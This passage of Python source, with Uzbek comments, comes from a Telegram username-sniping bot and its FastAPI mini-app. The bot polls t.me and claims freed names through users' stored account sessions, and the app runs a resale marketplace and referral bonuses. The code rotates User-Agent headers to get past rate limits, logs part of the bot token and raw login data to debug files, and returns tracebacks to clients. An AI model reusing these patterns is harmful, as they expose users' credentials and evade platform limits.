                        await bot.send_message(
                            task["telegram_id"],
                            f"🎯 <b>Nishon olindi!</b>\n\nKutgan usernamengiz bo'shadi va Siz uchun band qilindi: <b>@{uname}</b>",
                            parse_mode="HTML"
                        )
                    except Exception: pass
                    logger.info(f"🎉 MUVAFFAQIYAT! @{uname} olindi (User: {task['telegram_id']})")
                    break

                except FloodWaitError as e:
                    fw_until_ts = time.time() + e.seconds
                    session_floodwait[sess_key] = fw_until_ts
                    logger.warning(f"⛔ FloodWait {e.seconds}s (@{uname}) — User {task['telegram_id']}")
                    continue

                except Exception as ue:
                    err_str = str(ue).lower()
                    err_type = str(type(ue))

                    if "channelsadminpublictoomuch" in err_str or "channels_admin_public_too_much" in err_str or "ChannelsAdminPublicTooMuchError" in err_type:
                        logger.warning(f"❌ User {task['telegram_id']} ning ommaviy link limiti (10 ta) tugagan!")
                        async with aiosqlite.connect(DB_PATH) as db:
                            await db.execute("UPDATE monitoring_tasks SET status='failed_limit' WHERE id=?", (task["id"],))
                            await db.commit()
                        try:
                            await bot.send_message(
                                task["telegram_id"],
                                f"❌ <b>@{uname} bo'shadi, lekin ommaviy link limiti (10 ta) tugagani uchun ololmadim.</b>\n\n"
                                f"💡 Telegramingizda ba'zi kanallarni o'chirish orqali joyni bo'shating.",
                                parse_mode="HTML"
                            )
                        except Exception: pass
                        continue

                    elif "username_occupied" in err_str or "UsernameOccupied" in err_type:
                        logger.info(f"⛔ @{uname} band qilingan (UsernameOccupied)")
                        username_is_taken = True
                        taken_usernames_cache[uname.lower()] = time.time() + 43200  # 12 soat keshlashtirish
                        break

                    elif "username_invalid" in err_str or "UsernameInvalid" in err_type:
                        logger.info(f"⛔ @{uname} yaroqsiz username (UsernameInvalid)")
                        username_is_taken = True
                        taken_usernames_cache[uname.lower()] = time.time() + 43200  # 12 soat keshlashtirish
                        break

                    elif "purchase" in err_str or "UsernamePurchaseAvailable" in err_type:
                        logger.info(f"💰 @{uname} Fragment auksionida — oddiy claim mumkin emas")
                        username_is_taken = True
                        taken_usernames_cache[uname.lower()] = time.time() + 43200  # 12 soat keshlashtirish
                        try:
                            await bot.send_message(
                                task["telegram_id"],
                                f"💰 <b>@{uname} Fragment auksionida!</b>\n\n"
                                f"Bu username hozirda fragment.com auksionida sotilmoqda. "
                                f"Oddiy yo'l bilan band qilib bo'lmaydi.\n\n"
                                f"🔗 <a href='https://fragment.com/username/{uname}'>Fragment'da ko'rish</a>",
                                parse_mode="HTML", disable_web_page_preview=True
                            )
                        except Exception: pass
                        break

                    elif "spamreported" in err_str or "userrestricted" in err_str or ("spam" in err_str and "create" in err_str):
                        spamblocked_sessions.add(sess_key)
                        logger.warning(f"🚫 Spam-report sessiya ({task['telegram_id']}) — skip qilindi: {ue}")
                        try:
                            await bot.send_message(
                                task["telegram_id"],
                                "⚠️ <b>Akkauntingiz SpamBlock!</b>\n\n"
                                "Telegram akkauntingiz spam-report tushgani sababli yangi kanal ocha olmayapti.\n\n"
                                "🔧 @SpamBot ga yozing yoki boshqa yangi akkaunt ulang.",
                                parse_mode="HTML"
                            )
                        except Exception: pass
                        continue

                    elif "unsuccessful" in err_str or "rpccallfail" in err_str or "connection" in err_str or "timeout" in err_str:
                        logger.warning(f"⚠️ Telethon tarmoq xatosi (@{uname}): {ue}")
                        taken_usernames_cache[uname.lower()] = time.time() + 300  # 5 daqiqa kesh
                        continue

                    else:
                        logger.warning(f"Claim xato (@{uname}): {ue}")
                        taken_usernames_cache[uname.lower()] = time.time() + 3600  # 1 soat kesh
                        continue

                finally:
                    # HAR DOIM: Agar kanal yaratilgan bo'lsa va username biriktirish o'xshamasa — vaqtinchalik kanalni o'chiramiz
                    if ch_id and ch_access_hash and not success and client:
                        try:
                            await client(DeleteChannelRequest(
                                channel=InputChannel(ch_id, ch_access_hash)
                            ))
                            logger.info(f"🗑 Muvaffaqiyatsiz claim kanalini o'chirdik: @{uname} (ID: {ch_id})")
                        except Exception as de:
                            logger.warning(f"Kanal o'chirishda xato ({uname}): {de}")
                    # HAR DOIM: Telethon client yopilishi va keshdan o'chirilishi
                    if client:
                        try:
                            await client.disconnect()
                        except Exception: pass
                        _telethon_cache.pop(task["session_string"], None)

            if valid_sessions_count == 0:
                logger.warning(f"⚠️ @{uname} uchun yaroqli faol sessiya topilmadi!")
                for task in task_group:
                    try:
                        await bot.send_message(
                            task["telegram_id"],
                            f"⚠️ <b>@{uname} bo'shadi, lekin olib bo'lmadi!</b>\n\n"
                            f"Telegram akkauntingiz ulanganini va sessiya faolligini tekshiring.",
                            parse_mode="HTML"
                        )
                    except Exception: pass

        finally:
            claiming_now.discard(uname)


    http_session = None
    while True:
        try:
            # ── DARHOL TEKSHIRISH: Yangi qo'shilgan nishonlarni navbatdan olamiz
            while not instant_check_queue.empty():
                try:
                    queued_tid, queued_uname, queued_session = instant_check_queue.get_nowait()
                    u_lower = queued_uname.lower()
                    if u_lower in claiming_now:
                        logger.debug(f"⚡ [INSTANT SKIP] @{queued_uname} allaqachon claim jarayonida")
                        continue
                    # MUHIM: kesh tekshirilmaydi — monitoring uchun qo'shilgan nomlar doim tekshirilishi shart!

                    if http_session is None or http_session.closed:
                        http_session = aiohttp.ClientSession(
                            connector=aiohttp.TCPConnector(limit=10)
                        )

                    # Darhol Telethon API tekshiruvi
                    logger.info(f"⚡ [INSTANT CHECK] @{queued_uname} — Telethon API orqali darhol tekshirilmoqda...")
                    _check_client2 = None
                    try:
                        from telethon.tl.functions.account import CheckUsernameRequest as _CUR
                        _check_client2 = await _get_fast_client(queued_session)
                        _res2 = await asyncio.wait_for(
                            _check_client2(_CUR(queued_uname)),
                            timeout=5.0
                        )
                        if _res2 is True:
                            # Bo'sh! Darhol claim qilish
                            logger.info(f"⚡ [INSTANT FREE] @{queued_uname} BO'SH! Darhol band qilinmoqda...")
                            async with aiosqlite.connect(DB_PATH) as _db2:
                                _db2.row_factory = aiosqlite.Row
                                async with _db2.execute(
                                    "SELECT t.id, t.telegram_id, t.username, u.session_string "
                                    "FROM monitoring_tasks t JOIN users u ON t.telegram_id=u.telegram_id "
                                    "WHERE LOWER(t.username)=? AND t.status='monitoring'",
                                    (u_lower,)
                                ) as _c2:
                                    _tg = [dict(r) for r in await _c2.fetchall()]
                            if _tg:
                                logger.info(f"⚡ [INSTANT CLAIM] @{queued_uname} uchun claim task yaratildi ({len(_tg)} sessiya)")
                                asyncio.create_task(_claim_username(_tg, queued_uname, http_session))
                            else:
                                logger.warning(f"⚡ [INSTANT WARN] @{queued_uname} DB da monitoring_tasks topilmadi (status o'zgardi?)")
                        else:
                            # BAND — Lekin monitoring davom etishi uchun KESHGA OLMAYDI!
                            # (12 soat kesh nishon usernamelarini to'xtatib qo'yadi)
                            logger.info(f"⚡ [INSTANT TAKEN] @{queued_uname} hali band — monitoring davom etadi.")
                    except Exception as _qe:
                        logger.info(f"⚡ [INSTANT ERROR] @{queued_uname} tekshirishda xato: {type(_qe).__name__}: {_qe}")
                    finally:
                        if _check_client2:
                            try:
                                await _check_client2.disconnect()
                            except Exception: pass
                except asyncio.QueueEmpty:
                    break
                except Exception as qe:
                    logger.warning(f"Instant queue xato: {qe}")

            # TTL: Xotiradan o'tgan band nomlarni tozalash
            now_ts = time.time()
            expired = [k for k, v in taken_usernames_cache.items() if v < now_ts]
            for k in expired:
                del taken_usernames_cache[k]

            # last_checked_ts: monitoring_tasks da bo'lmagan nomlarni tozalash (xotira tejash)
            stale_keys = [k for k in last_checked_ts if k not in taken_usernames_cache and now_ts - last_checked_ts[k] > 300]
            for k in stale_keys:
                del last_checked_ts[k]

            async with aiosqlite.connect(DB_PATH) as db:
                db.row_factory = aiosqlite.Row
                async with db.execute(
                    "SELECT t.id, t.telegram_id, t.username, u.session_string "
                    "FROM monitoring_tasks t JOIN users u ON t.telegram_id=u.telegram_id "
                    "WHERE t.status='monitoring' "
                    "ORDER BY t.id DESC"
                ) as c:
                    tasks = await c.fetchall()

            if not tasks:
                await asyncio.sleep(1.5)
                continue

            # DEDUPLICATION & VALIDATION — faqat haqiqiy Telegram username'lar tekshirilsin (5-32 belgi, a-z, 0-9, _)
            import re
            uname_pattern = re.compile(r'^[a-z0-9_]{5,32}$')
            uname_map: dict = {}
            for t in tasks:
                u_lower = t["username"].lower().replace('@', '').strip()
                if not uname_pattern.match(u_lower):
                    # Yaroqsiz matn (masalan apostrof ' bo'lgan "yo'lboshchi") — avtomatik DB va nishonlar ro'yxatidan o'chirib tashlaymiz
                    async with aiosqlite.connect(DB_PATH) as db:
                        await db.execute("DELETE FROM monitoring_tasks WHERE id=?", (t["id"],))
                        await db.commit()
                    logger.info(f"🗑 Yaroqsiz nishon avtomatik o'chirildi: @{t['username']} (ID: {t['id']})")
                    continue
                if u_lower not in uname_map:
                    uname_map[u_lower] = []
                uname_map[u_lower].append(dict(t))

            hdr_idx = (hdr_idx + 1) % len(headers_list)

            # HTTP tekshiruv uchun parallel sonini belgilash (max 15)
            total_uniq = len(uname_map)
            concurrent = min(total_uniq, 15)
            if concurrent < 1:
                concurrent = 1
            sem = asyncio.Semaphore(concurrent)

            if http_session is None or http_session.closed:
                http_session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(limit=concurrent + 5)
                )

            # Monitoring log spami oldini olish: faqat har 60 soniyada
            nonlocal_now = time.time()
            if nonlocal_now - last_monitor_log_ts >= 60.0:
                target_list_str = ", ".join(f"@{u}" for u in list(uname_map.keys())[:5])
                if total_uniq > 5:
                    target_list_str += f" va yana {total_uniq - 5} ta"
                logger.info(f"📡 [MONITORING] {total_uniq} ta faol nishon poylanmoqda ({target_list_str})")
                last_monitor_log_ts = nonlocal_now
            
            if total_uniq == 0:
                await asyncio.sleep(2.0)
                continue

            async def check_uname_group(uname_lower, task_group):
                nonlocal global_429_count, taken_usernames_cache, last_channel_created, last_checked_ts
                # Kesh ichida bo'lsa — o'tkazib yuboramiz
                if taken_usernames_cache.get(uname_lower, 0) > time.time():
                    return

                # task_group bo'sh bo'lmasligi kerak
                if not task_group:
                    return

                # Rate limit: har bir username kamida CHECK_INTERVAL soniyada bir tekshiriladi
                now_t = time.time()
                last_t = last_checked_ts.get(uname_lower, 0)
                if now_t - last_t < CHECK_INTERVAL:
                    return  # Hali erta, keyingi tsiklga qoldiramiz

                async with sem:
                    # Parallellikni yumshatish: har so'rov orasiga kichik pauza
                    await asyncio.sleep(0.2)

                    # Global 429 cheklovi bo'lsa — kutamiz
                    if global_429_count > 0:
                        await asyncio.sleep(min(global_429_count * 2.0, 30.0))

                    uname = task_group[0]["username"]
                    last_checked_ts[uname_lower] = time.time()  # Tekshiruv vaqtini belgilaymiz
                    logger.info(f"Checking target @{uname}...")
                    try:
                        # 1-qadam: t.me HTTP tekshiruv (User-Agent rotatsiyasi, timeout 4.0s)
                        async with http_session.get(
                            f"https://t.me/{uname}", allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=4.0),
                            headers={'User-Agent': headers_list[hdr_idx]}
                        ) as resp:
                            if resp.status == 429:
                                global_429_count += 1
                                wait_time = min(5.0 * global_429_count, 60.0)
                                logger.warning(f"⚠️ t.me 429 #{global_429_count} — {wait_time:.0f}s kutilmoqda")
                                await asyncio.sleep(wait_time)
                                return
                            if global_429_count > 0:
                                global_429_count = max(0, global_429_count - 1)

                            text = await resp.text()  # HTML matnini o'qiymiz

                            # Aniq band profil, kanal, guruh, bot yoki fragment auksioni bo'lsa — monitoring davom etadi (CHECK_INTERVAL bilan)
                            taken_markers = (
                                'tgme_page_title', 'tgme_page_extra', 'tgme_page_photo',
                                'tgme_page_action', 'tgme_action_button_new', 'tgme_page_icon',
                                'fragment.com', 'tgme_page_description'
                            )
                            if any(k in text for k in taken_markers):
                                # Band bo'lsa keshlamaymiz (CHECK_INTERVAL rate-limit bo'yicha keyinroq qayta tekshiriladi)
                                return  # Hali band

                    except asyncio.TimeoutError:
                        logger.debug(f"HTTP timeout @{uname} — keyingi tsiklda qayta tekshiriladi")
                        return
                    except Exception as http_err:
                        logger.debug(f"HTTP xato @{uname}: {type(http_err).__name__}: {http_err}")
                        return

                    # Username bo'shagan ko'rinadi — alohida task sifatida darhol band qilamiz
                    if uname_lower not in claiming_now:
                        asyncio.create_task(_claim_username(task_group, uname, http_session))

            await asyncio.gather(*[
                check_uname_group(u, group) for u, group in uname_map.items()
            ])

        except Exception as e:
            logger.error(f"Monitoring loop xato: {e}")

        await asyncio.sleep(2.0)  # 2 soniya kutamiz — ortiqcha so'rovlar oldini oladi

# ─── FASTAPI APP ──────────────────────────────

class SubscriptionMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        path = request.url.path
        try:
            if (path.startswith("/api/") 
                and not path.startswith("/api/admin/") 
                and path not in ("/api/check_subscription", "/api/auth/webhook")
            ):
                init_data = request.headers.get("X-Telegram-Init-Data", "")
                if not init_data:
                    init_data = request.query_params.get("init_data", "")
                
                if init_data:
                    user = verify_init_data(init_data)
                    if user and isinstance(user, dict) and "id" in user:
                        user_id = user["id"]
                        unsubbed = await get_unsubscribed_channels(bot, user_id)
                        if unsubbed:
                            return JSONResponse(
                                status_code=403,
                                content={
                                    "error": "subscription_required", 
                                    "channels": [dict(c) for c in unsubbed]
                                }
                            )
            return await call_next(request)
        except Exception as e:
            import traceback
            logger.error(f"Middleware Error: {e}\n{traceback.format_exc()}")
            return JSONResponse(status_code=500, content={"error": "MIDDLEWARE_ERROR", "detail": str(e)})


app = FastAPI()
app.add_middleware(SubscriptionMiddleware)

# Static files
if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

_start_time = time.time()

@app.get("/health")
async def health_check():
    """Railway va monitoring tizimlar uchun health check endpoint."""
    db_ok = False
    db_users = 0
    db_monitoring = 0
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*) FROM users") as cur:
                row = await cur.fetchone()
                db_users = row[0] if row else 0
            async with db.execute("SELECT COUNT(*) FROM monitoring_tasks WHERE status='monitoring'") as cur:
                row = await cur.fetchone()
                db_monitoring = row[0] if row else 0
        db_ok = True
    except Exception as e:
        logger.warning(f"/health DB xato: {e}")

    uptime_sec = int(time.time() - _start_time)
    hours, rem = divmod(uptime_sec, 3600)
    mins, secs = divmod(rem, 60)

    return JSONResponse({
        "status": "ok" if db_ok else "degraded",
        "uptime": f"{hours}h {mins}m {secs}s",
        "db": "connected" if db_ok else "error",
        "users_total": db_users,
        "active_monitoring": db_monitoring,
        "stealth_clients": len(stealth_clients),
    })

@app.get("/ping")
async def ping():
    """Oddiy yashash tekshiruvi (Telegram webhook uchun ham)."""
    return {"ok": True}

# ── Helper: Telegram initData verifikatsiya ────
def verify_init_data(init_data: str) -> dict | None:
    try:
        from urllib.parse import parse_qsl
        if not init_data: return None
        params = dict(parse_qsl(init_data, keep_blank_values=True))
        received_hash = params.pop('hash', '')
        data_check = '\n'.join(f'{k}={v}' for k, v in sorted(params.items()))
        secret = hmac.new(b'WebAppData', BOT_TOKEN.encode(), hashlib.sha256).digest()
        calc_hash = hmac.new(secret, data_check.encode(), hashlib.sha256).hexdigest()
        
        # LOGGING
        try:
            with open("app_debug.log", "a", encoding="utf-8") as f:
                f.write(f"\n[VERIFY] REC_HASH: {received_hash[:10]}... CALC_HASH: {calc_hash[:10]}... TOKEN_PREFIX: {BOT_TOKEN[:15]}\n")
        except: pass
        
        if not hmac.compare_digest(calc_hash, received_hash):
            return None
            
        user_str = params.get('user', '{}')
        return json.loads(user_str)
    except Exception as e:
        try:
            with open("app_debug.log", "a", encoding="utf-8") as f:
                f.write(f"\n[VERIFY EXCEPTION] {e}\n")
        except: pass
        return None

async def check_if_fragment_username(http_session, uname: str) -> bool:
    """Tekshiradi: Username Fragment.com auksionida yoki NFT sifatida turibdimi"""
    # 1. t.me sahifasini tekshirish
    try:
        url = f"https://t.me/{uname}"
        async with http_session.get(url, timeout=3.0) as resp:
            if resp.status == 200:
                text = await resp.text()
                if 'fragment.com' in text.lower() or 'auction' in text.lower() or 'buy on fragment' in text.lower():
                    return True
    except Exception:
        pass

    # 2. Fragment.com to'g'ridan-to'g'ri tekshirish
    try:
        url = f"https://fragment.com/username/{uname}"
        async with http_session.get(url, timeout=3.0) as resp:
            if resp.status == 200:
                text = await resp.text()
                if 'table-cell' in text or 'tm-section' in text or 'auction' in text.lower() or 'sold' in text.lower():
                    return True
    except Exception:
        pass
    return False


def get_admin_token(telegram_id: int) -> str:
    secret = BOT_TOKEN + str(telegram_id)
    return hashlib.sha256(secret.encode()).hexdigest()[:32]

# ── Mini App Pages ─────────────────────────────
@app.get("/app")
async def mini_app():
    with open("static/app/index.html", encoding="utf-8") as f:
        return HTMLResponse(content=f.read(), headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
        })

@app.get("/admin")
async def admin_panel():
    with open("static/admin/index.html", encoding="utf-8") as f:
        return HTMLResponse(content=f.read(), headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
        })

# ── Debug endpointlar o'chirildi (xavfsizlik) ──────────────────────────────
# /debug_db, /logs, /test_token — production da yopiq


# ── Mini App API ───────────────────────────────

@app.get("/api/check_subscription")
async def api_check_subscription(request: Request):
    init_data = request.headers.get("X-Telegram-Init-Data", "")
    if not init_data: raise HTTPException(403)
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    
    user_id = user['id']
    unsubbed = await get_unsubscribed_channels(bot, user_id, bypass_cache=True)
    if not unsubbed:
        # Referral logic: Obunadan muvaffaqiyatli o'tsa, reward beramiz
        await process_referral_reward(user_id)
        return {"ok": True}
    else:
        return {"ok": False, "channels": [dict(c) for c in unsubbed]}

async def process_referral_reward(user_id: int):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            # Check users table
            async with db.execute("SELECT referrer_id, reward_given FROM users WHERE telegram_id=?", (user_id,)) as c:
                u_row = await c.fetchone()
            
            if u_row and u_row['referrer_id'] and not u_row['reward_given']:
                ref_id = u_row['referrer_id']
                # Check referrals table
                async with db.execute("SELECT id FROM referrals WHERE user_id=?", (user_id,)) as c:
                    ref_exists = await c.fetchone()
                
                if not ref_exists:
                    # Give reward
                    await db.execute("UPDATE users SET balance = balance + 1000 WHERE telegram_id=?", (ref_id,))
                    await db.execute("UPDATE users SET reward_given = 1 WHERE telegram_id=?", (user_id,))
                    await db.execute("INSERT INTO referrals (referrer_id, user_id, reward_given, reward_amount) VALUES (?, ?, 1, 1000)", (ref_id, user_id))
                    await db.commit()
                    
                    try:
                        await bot.send_message(ref_id, f"🎁 <b>Referral Bonus!</b>\nSizning do'stingiz majburiy obunadan o'tdi.\nBalansingizga <b>+1000 so'm</b> qo'shildi!", parse_mode="HTML")
                    except: pass
    except Exception as e:
        logger.error(f"process_referral_reward error: {e}")

@app.get("/api/user")
async def api_user(init_data: str = ""):
    try:
        user = verify_init_data(init_data)
        
        # DEBUG LOGGING (vaqtinchalik)
        import datetime
        try:
            with open("/app/data/debug_api.txt", "a", encoding="utf-8") as f:
                f.write(f"\n--- {datetime.datetime.now()} ---\n")
                f.write(f"INIT_DATA: {init_data}\n")
                f.write(f"USER_VERIFIED: {user}\n")
        except: pass
        
        if not user:
            raise HTTPException(403, "Invalid init_data")
        tid = user['id']
        await create_or_update_user(user)
        row = await get_user(tid)
        
        try:
            with open("/app/data/debug_api.txt", "a", encoding="utf-8") as f:
                f.write(f"USER_ROW_FROM_DB: {dict(row) if row else None}\n")
        except: pass
        
        # Count stats
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*) FROM orders WHERE telegram_id=?", (tid,)) as c:
                total_orders = (await c.fetchone())[0]
            async with db.execute("SELECT COUNT(*) FROM registered_usernames ru JOIN orders o ON ru.order_id=o.id WHERE o.telegram_id=?", (tid,)) as c:
                total_usernames = (await c.fetchone())[0]
            async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by=?", (tid,)) as c:
                referral_count = (await c.fetchone())[0]
                
        bot_instance = Bot(token=BOT_TOKEN)
        bot_me = await bot_instance.get_me()
        bot_username = bot_me.username
        await bot_instance.session.close()
        
        ref_link = f"https://t.me/{bot_username}?start=ref_{tid}"
        
        premium_price = int(await get_setting("premium_price", 20000))
        monitor_price = int(await get_setting("monitor_price", 10000))
        listing_price = int(await get_setting("listing_price", 1000))
        
        return {"balance": row["balance"] if row else 0, 
                "seller_balance": row.get("seller_balance", 0) if row else 0,
                "free_searches": row.get("free_searches", 1) if row else 1,
                "session_string": bool(row["session_string"]) if row else False,
                "first_name": row.get("first_name", "") if row else "",
                "is_premium": row.get("is_premium", 0) if row else 0,
                "premium_until": row.get("premium_until", "") if row else "",
                "total_orders": total_orders, "total_usernames": total_usernames,
                "referral_count": referral_count,
                "ref_link": ref_link,
                "premium_price": premium_price,
                "monitor_price": monitor_price,
                "listing_price": listing_price}
    except Exception as e:
        import traceback
        return {"error": f"API_USER_ERROR: {str(e)}\n{traceback.format_exc()}"}


@app.post("/api/account/set_username")
async def api_account_set_username(request: Request):
    """Foydalanuvchi tanlagan username ni uning Telegram profiliga TEZKOR o'rnatadi."""
    data = await request.json()
    user = verify_init_data(data.get('init_data', ''))
    if not user: raise HTTPException(403)
    tid = user['id']
    username = data.get('username', '').strip().lstrip('@')
    source_channel_id = data.get('channel_id')  # Frontend dari yuborilsa ishlatamiz
    if not username:
        return {"ok": False, "error": "Username kiritilmadi"}

    row = await get_user(tid)
    if not row or not row.get('session_string'):
        return {"ok": False, "error": "Akkaunt ulanmagan"}

    from telethon.tl.functions.account import UpdateUsernameRequest as AccountUpdateUsernameRequest
    from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest, UpdateUsernameRequest as ChannelUpdateUsernameRequest

    client = None
    try:
        client = await asyncio.wait_for(_get_fast_client(row['session_string']), timeout=8)
        
        # Agar kanal ID frontend dan kelmasa — kanal ro'yxatidan topamiz
        if not source_channel_id:
            req = GetAdminedPublicChannelsRequest(by_location=False, check_limit=False)
            res_ch = await client(req)
            for ch in res_ch.chats:
                if getattr(ch, 'username', '').lower() == username.lower():
                    source_channel_id = ch.id
                    break

        if source_channel_id:
            # Kanaldan username olib, profilga o'rnatishni PARALLEL bajaramiz
            old_me = await client.get_me()
            old_username = old_me.username or ""
            
            # 1-qadam: Kanaldan username'ni olib, profilga qo'yamiz (parallel)
            await asyncio.gather(
                client(ChannelUpdateUsernameRequest(channel=source_channel_id, username="")),
                return_exceptions=True
            )
            # 2-qadam: Profilga o'rnatish (shu zahotiyoq)
            await client(AccountUpdateUsernameRequest(username=username))
            
            # 3-qadam: Eski profil username'ini kanalga qaytarish — FONDA (kutmaydi)
            if old_username:
                _sess = row['session_string']
                _ch_id = source_channel_id
                _old_u = old_username
                async def restore_old():
                    try:
                        _cl = await _get_fast_client(_sess)
                        await _cl(ChannelUpdateUsernameRequest(channel=_ch_id, username=_old_u))
                        await _cl.disconnect()
                        _telethon_cache.pop(_sess, None)
                    except Exception:
                        pass
                asyncio.create_task(restore_old())
        else:
            # Oddiy profil username (kanal emas) — to'g'ridan to'g'ri o'rnatamiz
            await client(AccountUpdateUsernameRequest(username=username))
        
        return {"ok": True, "message": f"@{username} profilingizga o'rnatildi!"}
    except asyncio.TimeoutError:
        return {"ok": False, "error": "Ulanish vaqti tugadi. Qayta urinib ko'ring."}
    except Exception as e:
        logger.error(f"Set username error: {e}")
        return {"ok": False, "error": str(e)}
    finally:
        # Har doim disconnect — resource leak oldini olish
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
            _telethon_cache.pop(row['session_string'], None)


@app.post("/api/referral/send_promo")
async def api_referral_send_promo(request: Request):
    """Foydalanuvchiga rasmli reklama xabar yuboradi — u xohlagan guruhga forward qiladi."""
    data = await request.json()
    user = verify_init_data(data.get('init_data', ''))
    if not user:
        raise HTTPException(403)
    tid = user['id']

    try:
        b = Bot(token=BOT_TOKEN)
        bot_me = await b.get_me()
        bot_username = bot_me.username
        ref_link = f"https://t.me/{bot_username}?start=ref_{tid}"

        promo_caption = (
            "🎯 <b>Orzuingizdagi username — 1 soniyada!</b>\n\n"
            "🔍 Username qidirish — bo'sh nomlar topib beradi\n"
            "🎯 Poylash — bo'shagan zahoti avtomatik band qiladi\n"
            "🛒 Bozor — username sotish & sotib olish\n"
            "🔄 Almashtirish — 1 bosishda profilingizga o'rnatish\n\n"
            "🎁 Har bir do'st uchun <b>+1 000 so'm bonus!</b>\n\n"
            "👇 Hoziroq bosing:"
        )

        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🚀 Botga kirish (+1,000 so'm bonus)", url=ref_link)
        ]])

        import os
        banner_path = os.path.join(os.path.dirname(__file__), "static", "promo_banner.jpg")
        if os.path.exists(banner_path):
            from aiogram.types import FSInputFile
            photo = FSInputFile(banner_path)
            await b.send_photo(
                chat_id=tid,
                photo=photo,
                caption=promo_caption,
                parse_mode="HTML",
                reply_markup=kb
            )
        else:
            await b.send_message(
                chat_id=tid,
                text=promo_caption,
                parse_mode="HTML",
                reply_markup=kb
            )

        return {"ok": True}
    except Exception as e:
        logger.error(f"send_promo error: {e}")
        return {"ok": False, "error": str(e)}


@app.get("/api/account/usernames")

async def api_account_usernames(init_data: str = ""):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    tid = user['id']
    row = await get_user(tid)
    
    usernames = []
    seen = set()

    # 1. TELETHON — Hozir haqiqatan egalik qilinayotgan usernamelar (session bo'lsa)
    telethon_owned = set()  # Telethon orqali tasdiqlangan usernamelar

    if row and row.get('session_string'):
        client = None
        try:
            from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
            client = await asyncio.wait_for(_get_fast_client(row['session_string']), timeout=6)

            me, ch_res = await asyncio.wait_for(
                asyncio.gather(
                    client.get_me(),
                    client(GetAdminedPublicChannelsRequest(by_location=False, check_limit=False)),
                    return_exceptions=True
                ),
                timeout=8
            )

            # Shaxsiy profil username
            if not isinstance(me, Exception) and me and me.username:
                uname = me.username.lower()
                telethon_owned.add(uname)
                if uname not in seen:
                    seen.add(uname)
                    async with aiosqlite.connect(DB_PATH) as db:
                        async with db.execute("SELECT id FROM listings WHERE LOWER(username)=LOWER(?) AND status='active'", (me.username,)) as c:
                            is_listed = bool(await c.fetchone())
                    usernames.insert(0, {"username": me.username, "title": "Shaxsiy profil", "channel_id": None, "is_listed": is_listed})

            # Kanal va guruh usernamelar
            if not isinstance(ch_res, Exception) and ch_res:
                async with aiosqlite.connect(DB_PATH) as db:
                    for ch in ch_res.chats:
                        uname = getattr(ch, 'username', None)
                        title = getattr(ch, 'title', None)
                        if uname:
                            telethon_owned.add(uname.lower())
                            if uname.lower() not in seen:
                                if getattr(ch, 'creator', False) or getattr(ch, 'admin_rights', None):
                                    seen.add(uname.lower())
                                    async with db.execute("SELECT id FROM listings WHERE LOWER(username)=LOWER(?) AND status='active'", (uname,)) as lc:
                                        is_listed = bool(await lc.fetchone())
                                    usernames.append({"username": uname, "title": title or "Kanal/Guruh", "channel_id": ch.id, "is_listed": is_listed})
        except asyncio.TimeoutError:
            logger.warning(f"Telethon usernames timeout for user {tid} — DB fallback")
        except Exception as e:
            logger.warning(f"Telethon usernames fetch warning ({tid}): {e}")
        finally:
            # Har doim disconnect qilish — resource leak oldini olish!
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
                _telethon_cache.pop(row['session_string'], None)

    # 2. BAZADAN — Buyurtma orqali band qilingan usernamelar
    #    Agar Telethon session mavjud bo'lsa, faqat hozir ham egalik qilinayotganlarini ko'rsatamiz.
    #    Session yo'q bo'lsa — hamma DB usernamelarini ko'rsatamiz (tekshira olmaymiz).
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("""
            SELECT DISTINCT ru.username
            FROM registered_usernames ru
            JOIN orders o ON ru.order_id = o.id
            WHERE o.telegram_id=? AND ru.username IS NOT NULL AND ru.username != ''
            ORDER BY ru.id DESC LIMIT 50
        """, (tid,)) as c:
            for r in await c.fetchall():
                u = r['username']
                if not u:
                    continue
                # Telethon session bo'lsa — faqat hozir egalik qilinayotganlarni qo'sh
                if row and row.get('session_string'):
                    if u.lower() not in telethon_owned:
                        continue  # Bu username endi foydalanuvchida yo'q — o'tkazib yubor
                if u.lower() not in seen:
                    seen.add(u.lower())
                    async with db.execute("SELECT id FROM listings WHERE LOWER(username)=LOWER(?) AND status='active'", (u,)) as lc:
                        is_listed = bool(await lc.fetchone())
                    usernames.append({
                        "username": u,
                        "title": "Buyurtma orqali band qilingan",
                        "channel_id": None,
                        "is_listed": is_listed
                    })

    return {"usernames": usernames}



# ── MARKETPLACE ────────────────────────────────
@app.get("/api/marketplace")
async def api_marketplace(init_data: str = "", sort: str = "newest", offset: int = 0):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    
    order_clause = "ORDER BY u.is_premium DESC, l.id DESC"
    if sort == "cheapest":
        order_clause = "ORDER BY u.is_premium DESC, l.price ASC"
    elif sort == "expensive":
        order_clause = "ORDER BY u.is_premium DESC, l.price DESC"
        
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute(f"""
                SELECT l.*, u.first_name as seller_name, u.username as seller_username, 
                       (CASE WHEN u.is_premium = 1 AND (u.premium_until IS NULL OR CAST(u.premium_until AS INTEGER) > CAST(strftime('%s','now') AS INTEGER)) THEN 1 ELSE 0 END) as is_premium
                FROM listings l INNER JOIN users u ON l.seller_id = u.telegram_id
                WHERE l.status='active' AND u.session_string IS NOT NULL AND u.session_string != '' {order_clause} LIMIT 20 OFFSET ?
            """, (offset,)) as c:
                rows = [dict(r) for r in await c.fetchall()]
        return rows
    except Exception as e:
